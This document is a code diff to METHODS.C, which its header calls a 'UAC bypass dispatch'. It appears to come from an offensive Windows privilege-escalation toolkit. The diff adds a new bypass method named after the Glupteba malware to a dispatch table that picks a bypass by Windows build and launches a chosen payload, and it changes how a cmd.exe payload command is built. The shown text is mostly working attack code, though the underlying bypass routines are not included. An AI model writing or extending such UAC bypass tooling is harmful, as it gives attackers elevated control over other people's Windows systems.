@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.23
+*  VERSION:     3.24
 *
-*  DATE:        17 Dec 2019
+*  DATE:        20 Apr 2020
 *
 *  UAC bypass dispatch.
 *
@@ -71,6 +71,7 @@ UCM_API(MethodTokenModUIAccess);
 UCM_API(MethodShellWSReset);
 UCM_API(MethodEditionUpgradeManager);
 UCM_API(MethodDebugObject);
+UCM_API(MethodGlupteba);
 
 UCM_EXTRA_CONTEXT WDCallbackType1;
 
@@ -143,7 +144,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodShellWSReset, &WDCallbackType1, { 17134, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodSysprep, NULL, { 7600, 9600 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodEditionUpgradeManager, NULL, { 14393, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodDebugObject, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }
+    { MethodDebugObject, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodGlupteba, NULL, { 7600, 15063 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }
 };
 
 #define WDCallbackTypeMagicVer1 282647531814912
@@ -1205,7 +1207,7 @@ UCM_API(MethodShellWSReset)
 
         _strcpy(PayloadFinal, g_ctx->szSystemDirectory);
         _strcat(PayloadFinal, CMD_EXE);
-        _strcat(PayloadFinal, TEXT(" /c start "));
+        _strcat(PayloadFinal, RUN_CMD_COMMAND);
         _strcat(PayloadFinal, PayloadParameter);
 
         Result = ucmShellDelegateExecuteCommandMethod(
@@ -1248,4 +1250,20 @@ UCM_API(MethodDebugObject)
         lpszPayload = g_ctx->szOptionalParameter;
 
     return ucmDebugObjectMethod(lpszPayload);
+}
+
+UCM_API(MethodGlupteba)
+{
+    LPWSTR lpszPayload = NULL;
+    UNREFERENCED_PARAMETER(Parameter);
+
+    //
+    // Select target application or use given by optional parameter.
+    //
+    if (g_ctx->OptionalParameterLength == 0)
+        lpszPayload = g_ctx->szDefaultPayload;
+    else
+        lpszPayload = g_ctx->szOptionalParameter;
+
+    return ucmGluptebaMethod(lpszPayload);
 }
